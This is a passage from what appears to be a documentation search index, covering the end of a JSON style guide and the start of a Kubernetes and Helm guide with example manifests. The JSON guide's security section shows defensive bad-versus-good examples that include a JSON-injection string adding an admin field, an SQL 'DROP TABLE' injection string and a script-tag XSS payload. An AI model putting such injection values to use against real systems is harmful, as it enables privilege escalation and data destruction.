workaround for comments\",\n  \"name\": \"my-app\",\n  \"version\": \"1.0.0\"\n}\n</code></pre>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#formatting","title":"Formatting","text":"","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#indentation","title":"Indentation","text":"<p>Always use 2 spaces:</p> <pre><code>{\n  \"level1\": {\n    \"level2\": {\n      \"level3\": \"value\"\n    }\n  }\n}\n</code></pre>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#array-formatting","title":"Array Formatting","text":"<pre><code>{\n  \"short_array\": [1, 2, 3],\n  \"long_array\": [\n    \"item1\",\n    \"item2\",\n    \"item3\",\n    \"item4\"\n  ]\n}\n</code></pre>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#object-formatting","title":"Object Formatting","text":"<pre><code>{\n  \"small_object\": { \"key\": \"value\" },\n  \"large_object\": {\n    \"key1\": \"value1\",\n    \"key2\": \"value2\",\n    \"key3\": \"value3\"\n  }\n}\n</code></pre>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#testing","title":"Testing","text":"","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#schema-validation","title":"Schema Validation","text":"<p>Use JSON Schema to validate JSON files:</p> <pre><code>## schema/config.schema.json\n{\n  \"$schema\": \"http://json-schema.org/draft-07/schema#\",\n  \"type\": \"object\",\n  \"required\": [\"name\", \"version\", \"environment\"],\n  \"properties\": {\n    \"name\": {\n      \"type\": \"string\",\n      \"minLength\": 1\n    },\n    \"version\": {\n      \"type\": \"string\",\n      \"pattern\": \"^\\\\d+\\\\.\\\\d+\\\\.\\\\d+$\"\n    },\n    \"environment\": {\n      \"type\": \"string\",\n      \"enum\": [\"development\", \"staging\", \"production\"]\n    },\n    \"port\": {\n      \"type\": \"integer\",\n      \"minimum\": 1024,\n      \"maximum\": 65535\n    }\n  }\n}\n</code></pre>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#validating-with-ajv","title":"Validating with ajv","text":"<pre><code>## Install ajv-cli\nnpm install -g ajv-cli\n\n## Validate JSON against schema\najv validate -s schema/config.schema.json -d config.json\n\n## Validate multiple files\najv validate -s schema/config.schema.json -d \"configs/*.json\"\n</code></pre>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#automated-validation-in-cicd","title":"Automated Validation in CI/CD","text":"<pre><code>## .github/workflows/validate-json.yml\nname: Validate JSON\n\non: [push, pull_request]\n\njobs:\n  validate:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Install ajv-cli\n        run: npm install -g ajv-cli\n\n      - name: Validate JSON files\n        run: |\n          for file in **/*.json; do\n            echo \"Validating $file\"\n            ajv validate -s schema/config.schema.json -d \"$file\"\n          done\n</code></pre>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#linting-json","title":"Linting JSON","text":"<pre><code>## Install jsonlint\nnpm install -g jsonlint\n\n## Lint JSON file\njsonlint config.json\n\n## Lint with quiet mode\njsonlint -q config.json\n\n## Lint multiple files\nfind . -name \"*.json\" -exec jsonlint {} \\;\n</code></pre>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#testing-with-jq","title":"Testing with jq","text":"<p>Validate JSON structure and content:</p> <pre><code>## Check if file is valid JSON\njq empty config.json\n\n## Validate specific fields exist\njq -e '.name' config.json\njq -e '.version' config.json\n\n## Test field values\nif [ \"$(jq -r '.environment' config.json)\" != \"production\" ]; then\n  echo \"Invalid environment\"\n  exit 1\nfi\n\n## Validate array length\nif [ \"$(jq '.servers | length' config.json)\" -lt 2 ]; then\n  echo \"Must have at least 2 servers\"\n  exit 1\nfi\n</code></pre>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#testing-json-api-responses","title":"Testing JSON API Responses","text":"<pre><code>## Test API response structure\nresponse=$(curl -s https://api.example.com/users/1)\n\n## Validate response is valid JSON\necho \"$response\" | jq empty\n\n## Validate required fields\necho \"$response\" | jq -e '.id, .name, .email' &gt; /dev/null\n\n## Test specific values\nuser_id=$(echo \"$response\" | jq -r '.id')\nif [ \"$user_id\" != \"1\" ]; then\n  echo \"Unexpected user ID\"\n  exit 1\nfi\n</code></pre>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#json-diff-testing","title":"JSON Diff Testing","text":"<p>Compare JSON files:</p> <pre><code>## Install json-diff\nnpm install -g json-diff\n\n## Compare two JSON files\njson-diff config-old.json config-new.json\n\n## Colorized output\njson-diff --color config-old.json config-new.json\n\n## Keys only\njson-diff --keys-only config-old.json config-new.json\n</code></pre>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#testing-in-scripts","title":"Testing in Scripts","text":"<pre><code>## test/json-validation.test.js\nconst Ajv = require('ajv');\nconst fs = require('fs');\n\ndescribe('JSON Configuration Tests', () =&gt; {\n  let ajv;\n  let schema;\n\n  beforeAll(() =&gt; {\n    ajv = new Ajv();\n    schema = JSON.parse(fs.readFileSync('schema/config.schema.json', 'utf8'));\n  });\n\n  test('config.json should be valid', () =&gt; {\n    const config = JSON.parse(fs.readFileSync('config.json', 'utf8'));\n    const validate = ajv.compile(schema);\n    const valid = validate(config);\n\n    expect(valid).toBe(true);\n    if (!valid) {\n      console.error(validate.errors);\n    }\n  });\n\n  test('production config should have required security settings', () =&gt; {\n    const config = JSON.parse(fs.readFileSync('config.production.json', 'utf8'));\n\n    expect(config.ssl.enabled).toBe(true);\n    expect(config.auth.required).toBe(true);\n  });\n});\n</code></pre>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#pre-commit-hook-for-json-validation","title":"Pre-commit Hook for JSON Validation","text":"<pre><code>## .pre-commit-config.yaml\nrepos:\n  - repo: https://github.com/pre-commit/pre-commit-hooks\n    rev: v4.5.0\n    hooks:\n      - id: check-json\n      - id: pretty-format-json\n        args: ['--autofix', '--indent=2', '--no-sort-keys']\n\n  - repo: https://github.com/python-jsonschema/check-jsonschema\n    rev: 0.27.0\n    hooks:\n      - id: check-jsonschema\n        name: Validate JSON configs\n        files: \"config.*\\\\.json$\"\n        args: [\"--schemafile\", \"schema/config.schema.json\"]\n</code></pre>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#performance-testing-json-processing","title":"Performance Testing JSON Processing","text":"<pre><code>## Test JSON file size\nsize=$(stat -f%z config.json 2&gt;/dev/null || stat -c%s config.json)\nmax_size=$((1024 * 1024))  # 1MB\n\nif [ \"$size\" -gt \"$max_size\" ]; then\n  echo \"JSON file too large: $(($size / 1024))KB\"\n  exit 1\nfi\n\n## Test parsing performance\ntime jq '.' large-file.json &gt; /dev/null\n</code></pre>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#security-best-practices","title":"Security Best Practices","text":"","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#never-store-secrets-in-json","title":"Never Store Secrets in JSON","text":"<p>JSON files are often committed to version control - never store sensitive data:</p> <pre><code>// Bad - Secrets in JSON (especially in version control)\n{\n  \"database\": {\n    \"host\": \"db.example.com\",\n    \"password\": \"MySecretPassword123\",  // \u274c Exposed!\n    \"apiKey\": \"sk-1234567890abcdef\"     // \u274c Hardcoded!\n  }\n}\n\n// Good - Use placeholders for environment variables\n{\n  \"database\": {\n    \"host\": \"${DB_HOST}\",\n    \"password\": \"${DB_PASSWORD}\",  // \u2705 From environment\n    \"apiKey\": \"${API_KEY}\"\n  }\n}\n\n// Good - Reference external secure storage\n{\n  \"database\": {\n    \"host\": \"db.example.com\",\n    \"password\": \"vault://secrets/db/password\",\n    \"apiKey\": \"ssm:///myapp/api-key\"\n  }\n}\n</code></pre> <p>Key Points:</p> <ul> <li>Never commit secrets to version control</li> <li>Use environment variables for sensitive data</li> <li>Reference secret management systems (Vault, AWS Secrets Manager)</li> <li>Use <code>.env</code> files (gitignored) for local development</li> <li>Scan repositories for accidentally committed secrets</li> </ul>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#validate-json-schema","title":"Validate JSON Schema","text":"<p>Always validate JSON against a schema to prevent injection and data corruption:</p> <pre><code>// Good - Validate with JSON Schema\nimport Ajv from 'ajv';\n\nconst schema = {\n  type: 'object',\n  properties: {\n    username: { type: 'string', pattern: '^[a-zA-Z0-9_-]+$' },\n    email: { type: 'string', format: 'email' },\n    age: { type: 'integer', minimum: 0, maximum: 150 }\n  },\n  required: ['username', 'email'],\n  additionalProperties: false  // \u2705 Prevent unexpected properties\n};\n\nconst ajv = new Ajv();\nconst validate = ajv.compile(schema);\n\nfunction processUserData(data: unknown) {\n  if (!validate(data)) {\n    throw new Error(`Invalid data: ${ajv.errorsText(validate.errors)}`);\n  }\n  // Safe to use validated data\n  return data;\n}\n</code></pre> <p>Key Points:</p> <ul> <li>Define JSON schemas for all data structures</li> <li>Validate all external JSON input</li> <li>Use <code>additionalProperties: false</code> to prevent unexpected fields</li> <li>Enforce format constraints (email, URL, date)</li> <li>Fail fast on invalid data</li> </ul>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#prevent-json-injection","title":"Prevent JSON Injection","text":"<p>Sanitize data before embedding in JSON:</p> <pre><code>// Bad - String concatenation (injection risk)\nconst userInput = '\", \"isAdmin\": true, \"fake\": \"';\nconst json = `{\"username\": \"${userInput}\"}`;  // \u274c Injected admin field!\n// Result: {\"username\": \"\", \"isAdmin\": true, \"fake\": \"\"}\n\n// Good - Use JSON.stringify (automatic escaping)\nconst userInput = '\"; DROP TABLE users; --';\nconst safeJson = JSON.stringify({ username: userInput });  // \u2705 Properly escaped\n\n// Good - Validate before parsing\nfunction safeJSONParse(text: string): unknown {\n  try {\n    const parsed = JSON.parse(text);\n    // Validate against schema here\n    return parsed;\n  } catch (error) {\n    throw new Error('Invalid JSON');\n  }\n}\n</code></pre> <p>Key Points:</p> <ul> <li>Always use <code>JSON.stringify()</code> and <code>JSON.parse()</code></li> <li>Never build JSON with string concatenation</li> <li>Validate after parsing</li> <li>Sanitize user inputs before JSON encoding</li> <li>Use TypeScript for type safety</li> </ul>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#limit-json-size","title":"Limit JSON Size","text":"<p>Prevent denial of service from large JSON payloads:</p> <pre><code>// Good - Limit JSON payload size\nimport express from 'express';\n\nconst app = express();\n\napp.use(express.json({\n  limit: '100kb',  // \u2705 Limit payload size\n  strict: true,    // Only accept objects and arrays\n}));\n\n// Good - Streaming parser for large files\nimport { parser } from 'stream-json';\nimport { streamArray } from 'stream-json/streamers/StreamArray';\n\nconst pipeline = fs.createReadStream('large-file.json')\n  .pipe(parser())\n  .pipe(streamArray())\n  .on('data', ({ value }) =&gt; {\n    // Process each item individually\n    processItem(value);\n  });\n</code></pre> <p>Key Points:</p> <ul> <li>Set maximum payload size limits</li> <li>Use streaming parsers for large files</li> <li>Implement timeouts for JSON parsing</li> <li>Monitor memory usage</li> <li>Reject deeply nested structures</li> </ul>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#sanitize-output","title":"Sanitize Output","text":"<p>Prevent Cross-Site Scripting (XSS) when displaying JSON in HTML:</p> <pre><code>// Bad - Directly embedding JSON in HTML\nconst data = { name: '&lt;script&gt;alert(\"XSS\")&lt;/script&gt;' };\nconst html = `&lt;div&gt;${JSON.stringify(data)}&lt;/div&gt;`;  // \u274c XSS vulnerability!\n\n// Good - Properly escape for HTML context\nfunction escapeHTML(str: string): string {\n  return str\n    .replace(/&amp;/g, '&amp;amp;')\n    .replace(/&lt;/g, '&amp;lt;')\n    .replace(/&gt;/g, '&amp;gt;')\n    .replace(/\"/g, '&amp;quot;')\n    .replace(/'/g, '&amp;#x27;');\n}\n\nconst safeHTML = `&lt;div&gt;${escapeHTML(JSON.stringify(data))}&lt;/div&gt;`;  // \u2705 Safe\n</code></pre> <p>Key Points:</p> <ul> <li>Escape JSON before embedding in HTML</li> <li>Use Content Security Policy (CSP) headers</li> <li>Avoid <code>innerHTML</code> with user-controlled JSON</li> <li>Use safe templating libraries</li> <li>Sanitize before display</li> </ul>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#file-access-control","title":"File Access Control","text":"<p>Protect JSON configuration files with appropriate permissions:</p> <pre><code>## Good - Restrictive file permissions\n# Configuration files (readable by application)\nchmod 640 config.json\nchown app:app config.json\n\n# Secrets files (readable only by application)\nchmod 600 secrets.json\nchown app:app secrets.json\n\n# Public configuration\nchmod 644 public-config.json\n</code></pre> <p>Key Points:</p> <ul> <li>Set restrictive file permissions (600 or 640)</li> <li>Use appropriate file ownership</li> <li>Never make secrets world-readable</li> <li>Audit file access regularly</li> <li>Encrypt sensitive JSON files at rest</li> </ul>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#anti-patterns","title":"Anti-Patterns","text":"","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#avoid-trailing-commas","title":"\u274c Avoid: Trailing Commas","text":"<pre><code>// Bad - Trailing comma (invalid JSON)\n{\n  \"name\": \"my-app\",\n  \"version\": \"1.0.0\",\n}\n\n// Good - No trailing comma\n{\n  \"name\": \"my-app\",\n  \"version\": \"1.0.0\"\n}\n</code></pre>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#avoid-single-quotes","title":"\u274c Avoid: Single Quotes","text":"<pre><code>// Bad - Single quotes (invalid JSON)\n{\n  'name': 'my-app'\n}\n\n// Good - Double quotes\n{\n  \"name\": \"my-app\"\n}\n</code></pre>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#avoid-unquoted-keys","title":"\u274c Avoid: Unquoted Keys","text":"<pre><code>// Bad - Unquoted keys (invalid JSON)\n{\n  name: \"my-app\"\n}\n\n// Good - Quoted keys\n{\n  \"name\": \"my-app\"\n}\n</code></pre>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#avoid-comments-in-standard-json","title":"\u274c Avoid: Comments in Standard JSON","text":"<pre><code>// Bad - Comments in standard JSON (invalid)\n{\n  // This is a comment\n  \"name\": \"my-app\"\n}\n\n// Good - No comments (use JSONC or JSON5 if needed)\n{\n  \"name\": \"my-app\"\n}\n</code></pre>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#avoid-deep-nesting","title":"\u274c Avoid: Deep Nesting","text":"<pre><code>// Bad - Deeply nested structure (hard to maintain)\n{\n  \"app\": {\n    \"config\": {\n      \"database\": {\n        \"connections\": {\n          \"primary\": {\n            \"settings\": {\n              \"host\": \"localhost\",\n              \"port\": 5432\n            }\n          }\n        }\n      }\n    }\n  }\n}\n\n// Good - Flatter structure\n{\n  \"app_database_host\": \"localhost\",\n  \"app_database_port\": 5432\n}\n\n// Or use references\n{\n  \"database_settings\": {\n    \"host\": \"localhost\",\n    \"port\": 5432\n  },\n  \"app_config\": {\n    \"database\": \"$ref:database_settings\"\n  }\n}\n</code></pre>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#avoid-inconsistent-naming-conventions","title":"\u274c Avoid: Inconsistent Naming Conventions","text":"<pre><code>// Bad - Mixed naming styles\n{\n  \"firstName\": \"John\",\n  \"last_name\": \"Doe\",\n  \"EmailAddress\": \"john@example.com\",\n  \"phone-number\": \"555-1234\"\n}\n\n// Good - Consistent camelCase (or snake_case throughout)\n{\n  \"firstName\": \"John\",\n  \"lastName\": \"Doe\",\n  \"emailAddress\": \"john@example.com\",\n  \"phoneNumber\": \"555-1234\"\n}\n</code></pre>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#avoid-storing-sensitive-data","title":"\u274c Avoid: Storing Sensitive Data","text":"<pre><code>// Bad - Sensitive data in JSON (especially in version control)\n{\n  \"database\": {\n    \"password\": \"MySecretPassword123\",\n    \"apiKey\": \"sk-1234567890abcdef\"\n  }\n}\n\n// Good - Use environment variables or secure vaults\n{\n  \"database\": {\n    \"password\": \"${DB_PASSWORD}\",\n    \"apiKey\": \"${API_KEY}\"\n  }\n}\n\n// Or reference external secure storage\n{\n  \"database\": {\n    \"password\": \"vault://secrets/db/password\",\n    \"apiKey\": \"vault://secrets/api/key\"\n  }\n}\n</code></pre>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#json-validation","title":"JSON Validation","text":"","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#using-jq","title":"Using jq","text":"<pre><code>## Validate JSON file\njq empty config.json\n\n## Pretty print\njq . config.json\n\n## Extract specific field\njq '.name' package.json\n\n## Filter array\njq '.users[] | select(.age &gt; 18)' users.json\n</code></pre>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#using-jsonlint","title":"Using jsonlint","text":"<pre><code>## Validate JSON\njsonlint config.json\n\n## Format JSON\njsonlint -i config.json\n</code></pre>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#using-python","title":"Using Python","text":"<pre><code>import json\n\n## Validate JSON\nwith open('config.json') as f:\n    try:\n        data = json.load(f)\n        print(\"Valid JSON\")\n    except json.JSONDecodeError as e:\n        print(f\"Invalid JSON: {e}\")\n\n## Pretty print\nprint(json.dumps(data, indent=2))\n</code></pre>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#tool-configurations","title":"Tool Configurations","text":"","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#vscode-settingsjson","title":"VSCode settings.json","text":"<pre><code>{\n  \"json.schemas\": [\n    {\n      \"fileMatch\": [\"package.json\"],\n      \"url\": \"https://json.schemastore.org/package.json\"\n    },\n    {\n      \"fileMatch\": [\"tsconfig.json\"],\n      \"url\": \"https://json.schemastore.org/tsconfig.json\"\n    }\n  ],\n  \"json.format.enable\": true,\n  \"[json]\": {\n    \"editor.defaultFormatter\": \"esbenp.prettier-vscode\",\n    \"editor.formatOnSave\": true,\n    \"editor.tabSize\": 2\n  },\n  \"[jsonc]\": {\n    \"editor.defaultFormatter\": \"esbenp.prettier-vscode\"\n  }\n}\n</code></pre>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#prettierrc-prettier","title":".prettierrc (Prettier)","text":"<pre><code>{\n  \"semi\": true,\n  \"singleQuote\": false,\n  \"tabWidth\": 2,\n  \"trailingComma\": \"none\",\n  \"printWidth\": 100,\n  \"arrowParens\": \"always\"\n}\n</code></pre>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#references","title":"References","text":"","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#official-documentation","title":"Official Documentation","text":"<ul> <li>JSON Specification</li> <li>RFC 8259 - JSON Standard</li> <li>JSON Schema - Schema validation</li> </ul>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#tools","title":"Tools","text":"<ul> <li>jq - Command-line JSON processor</li> <li>jsonlint - JSON validator</li> <li>JSON Formatter - Online JSON formatter</li> </ul>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#schema-repositories","title":"Schema Repositories","text":"<ul> <li>JSON Schema Store - Collection of JSON schemas</li> </ul> <p>Version: 1.0.0 Last Updated: 2025-10-28 Status: Active</p>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/kubernetes/","title":"Kubernetes & Helm Style Guide","text":"","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#language-overview","title":"Language Overview","text":"<p>Kubernetes is a container orchestration platform for automating deployment, scaling, and management of containerized applications. Helm is the package manager for Kubernetes, using charts to define, install, and upgrade applications.</p>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#key-characteristics","title":"Key Characteristics","text":"<ul> <li>Paradigm: Declarative infrastructure as code</li> <li>Language: YAML manifests</li> <li>Version Support: Kubernetes 1.28.x through 1.31.x</li> <li>Package Manager: Helm 3.x (chartless installation)</li> <li>Modern Approach: Helm charts for reusable application definitions</li> </ul>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#primary-use-cases","title":"Primary Use Cases","text":"<ul> <li>Container orchestration</li> <li>Microservices deployment</li> <li>Application scaling and rolling updates</li> <li>Service discovery and load balancing</li> <li>Configuration and secret management</li> </ul>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#quick-reference","title":"Quick Reference","text":"Category Convention Example Notes Naming Resources <code>kebab-case</code> <code>my-app-deployment</code>, <code>web-service</code> Lowercase with hyphens Namespaces <code>kebab-case</code> <code>production</code>, <code>staging</code> Environment or team based Labels <code>kebab-case</code> keys <code>app: my-app</code>, <code>env: prod</code> Consistent label keys Helm Charts <code>kebab-case</code> <code>my-application</code> Chart directory name Resource Types Deployment Application workloads <code>kind: Deployment</code> Stateless apps StatefulSet Stateful workloads <code>kind: StatefulSet</code> Databases, persistent apps Service Network services <code>kind: Service</code> Load balancing, discovery ConfigMap Configuration <code>kind: ConfigMap</code> Non-sensitive config Secret Sensitive data <code>kind: Secret</code> Passwords, tokens Ingress HTTP routing <code>kind: Ingress</code> External access File Naming Manifests <code>resource-type.yaml</code> <code>deployment.yaml</code>, <code>service.yaml</code> One resource per file Combined <code>app-name.yaml</code> <code>my-app.yaml</code> All resources together Helm Values <code>values.yaml</code> <code>values.yaml</code>, <code>values-prod.yaml</code> Chart values Labels app Application name <code>app: nginx</code> Required label version App version <code>version: \"1.0.0\"</code> Deployment tracking environment Environment <code>environment: production</code> Env identification Best Practices Resource Limits Always set <code>limits:</code> and <code>requests:</code> CPU and memory Readiness Probes Define probes <code>readinessProbe:</code> Health checking Namespaces Use namespaces Isolate workloads Multi-tenancy Helm Charts Package with Helm Reusable templates DRY principle","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#naming-conventions","title":"Naming Conventions","text":"","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#resource-names","title":"Resource Names","text":"<p>Use kebab-case for all Kubernetes resource names:</p> <pre><code>## Good\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web-application\n  namespace: production\n\n## Bad\nmetadata:\n  name: webApplication  # camelCase - avoid\n  name: web_application  # snake_case - avoid\n</code></pre>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#namespace-conventions","title":"Namespace Conventions","text":"<pre><code>## Environment-based namespaces\nproduction\nstaging\ndevelopment\n\n## Team or project-based namespaces\nteam-platform\nteam-backend\nproject-analytics\n\n## System namespaces (reserved)\nkube-system\nkube-public\nkube-node-lease\ndefault\n</code></pre>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#label-standards","title":"Label Standards","text":"","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#required-labels","title":"Required Labels","text":"<p>Apply these labels to ALL resources:</p> <pre><code>metadata:\n  labels:\n    app.kubernetes.io/name: nginx\n    app.kubernetes.io/instance: nginx-production\n    app.kubernetes.io/version: \"1.24.0\"\n    app.kubernetes.io/component: webserver\n    app.kubernetes.io/part-of: ecommerce-platform\n    app.kubernetes.io/managed-by: helm\n</code></pre>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#label-descriptions","title":"Label Descriptions","text":"<pre><code>app.kubernetes.io/name: \"nginx\"           # Application name\napp.kubernetes.io/instance: \"nginx-prod\"  # Unique instance identifier\napp.kubernetes.io/version: \"1.24.0\"       # Application version\napp.kubernetes.io/component: \"webserver\"  # Component within architecture\napp.kubernetes.io/part-of: \"platform\"     # Application group/system\napp.kubernetes.io/managed-by: \"helm\"      # Tool managing the resource\n</code></pre>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#custom-labels","title":"Custom Labels","text":"<pre><code>metadata:\n  labels:\n    # Standard labels\n    app.kubernetes.io/name: api\n    app.kubernetes.io/instance: api-production\n    # Custom labels\n    environment: production\n    team: backend\n    cost-center: engineering\n</code></pre>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#annotation-patterns","title":"Annotation Patterns","text":"<pre><code>metadata:\n  annotations:\n    # Deployment metadata\n    kubernetes.io/change-cause: \"Update to v1.2.3\"\n    deployment.kubernetes.io/revision: \"5\"\n\n    # Documentation\n    description: \"User authentication API\"\n    contact: \"platform-team@example.com\"\n    documentation: \"https://docs.example.com/api\"\n\n    # Monitoring and alerting\n    prometheus.io/scrape: \"true\"\n    prometheus.io/port: \"9090\"\n    prometheus.io/path: \"/metrics\"\n\n    # Service mesh (Istio/Linkerd)\n    sidecar.istio.io/inject: \"true\"\n    linkerd.io/inject: enabled\n</code></pre>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#deployment-manifests","title":"Deployment Manifests","text":"<pre><code>---\n## @module web-application-deployment\n## @description Production deployment for web application\n## @version 1.0.0\n## @author Tyler Dukes\n## @last_updated 2025-10-28\n\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web-application\n  namespace: production\n  labels:\n    app.kubernetes.io/name: web-application\n    app.kubernetes.io/instance: web-production\n    app.kubernetes.io/version: \"1.2.3\"\n    app.kubernetes.io/component: frontend\n    app.kubernetes.io/part-of: ecommerce\n    app.kubernetes.io/managed-by: helm\nspec:\n  replicas: 3\n  revisionHistoryLimit: 10\n  strategy:\n    type: RollingUpdate\n    rollingUpdate:\n      maxSurge: 1\n      maxUnavailable: 0\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: web-application\n      app.kubernetes.io/instance: web-production\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: web-application\n        app.kubernetes.io/instance: web-production\n        app.kubernetes.io/version: \"1.2.3\"\n      annotations:\n        prometheus.io/scrape: \"true\"\n        prometheus.io/port: \"8080\"\n    spec:\n      serviceAccountName: web-application\n      securityContext:\n        runAsNonRoot: true\n        runAsUser: 1000\n        fsGroup: 1000\n      containers:\n        - name: web\n          image: myregistry.com/web-application:1.2.3\n          imagePullPolicy: IfNotPresent\n          ports:\n            - name: http\n              containerPort: 8080\n              protocol: TCP\n          env:\n            - name: APP_ENV\n              value: \"production\"\n            - name: DATABASE_HOST\n              valueFrom:\n                configMapKeyRef:\n                  name: app-config\n                  key: database_host\n            - name: DATABASE_PASSWORD\n              valueFrom:\n                secretKeyRef:\n                  name: app-secrets\n                  key: database_password\n          resources:\n            requests:\n              cpu: 100m\n              memory: 128Mi\n            limits:\n              cpu: 500m\n              memory: 512Mi\n          livenessProbe:\n            httpGet:\n              path: /health\n              port: http\n            initialDelaySeconds: 30\n            periodSeconds: 10\n            timeoutSeconds: 5\n            failureThreshold: 3\n          readinessProbe:\n            httpGet:\n              path: /ready\n              port: http\n            initialDelaySeconds: 10\n            periodSeconds: 5\n            timeoutSeconds: 3\n            failureThreshold: 3\n          startupProbe:\n            httpGet:\n              path: /startup\n              port: http\n            initialDelaySeconds: 0\n            periodSeconds: 5\n            timeoutSeconds: 3\n            failureThreshold: 30\n          volumeMounts:\n            - name: config\n              mountPath: /etc/app/config\n              readOnly: true\n            - name: cache\n              mountPath: /var/cache/app\n      volumes:\n        - name: config\n          configMap:\n            name: app-config\n        - name: cache\n          emptyDir: {}\n</code></pre>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#service-definitions","title":"Service Definitions","text":"<pre><code>---\napiVersion: v1\nkind: Service\nmetadata:\n  name: web-application\n  namespace: production\n  labels:\n    app.kubernetes.io/name: web-application\n    app.kubernetes.io/instance: web-production\nspec:\n  type: ClusterIP\n  ports:\n    - name: http\n      port: 80\n      targetPort: http\n      protocol: TCP\n  selector:\n    app.kubernetes.io/name: web-application\n    app.kubernetes.io/instance: web-production\n\n---\n## LoadBalancer service\napiVersion: v1\nkind: Service\nmetadata:\n  name: web-application-public\n  namespace: production\n  annotations:\n    service.beta.kubernetes.io/aws-load-balancer-type: \"nlb\"\nspec:\n  type: LoadBalancer\n  ports:\n    - name: https\n      port: 443\n      targetPort: http\n      protocol: TCP\n  selector:\n    app.kubernetes.io/name: web-application\n</code></pre>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#configmap-and-secret-patterns","title":"ConfigMap and Secret Patterns","text":"","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#configmap","title":"ConfigMap","text":"<pre><code>---\napiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: app-config\n  namespace: production\n  labels:\n    app.kubernetes.io/name: web-application\ndata:\n  app.env: \"production\"\n  database_host: \"postgres.production.svc.cluster.local\"\n  database_port: \"5432\"\n  redis_host: \"redis.production.svc.cluster.local\"\n  log_level: \"info\"\n\n  # Configuration file\n  nginx.conf: |\n    server {\n        listen 8080;\n        location / {\n            proxy_pass http://backend:8080;\n        }\n    }\n</code></pre>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#secret","title":"Secret","text":"<pre><code>---\napiVersion: v1\nkind: Secret\nmetadata:\n  name: app-secrets\n  namespace: production\n  labels:\n    app.kubernetes.io/name: web-application\ntype: Opaque\nstringData:\n  database_password: \"super-secret-password\"\n  api_key: \"secret-api-key-12345\"\n  jwt_secret: \"jwt-signing-secret\"\n\n## Use external secret management\n---\napiVersion: external-secrets.io/v1beta1\nkind: ExternalSecret\nmetadata:\n  name: app-secrets\n  namespace: production\nspec:\n  refreshInterval: 1h\n  secretStoreRef:\n    name: aws-secrets-manager\n    kind: SecretStore\n  target:\n    name: app-secrets\n  data:\n    - secretKey: database_password\n      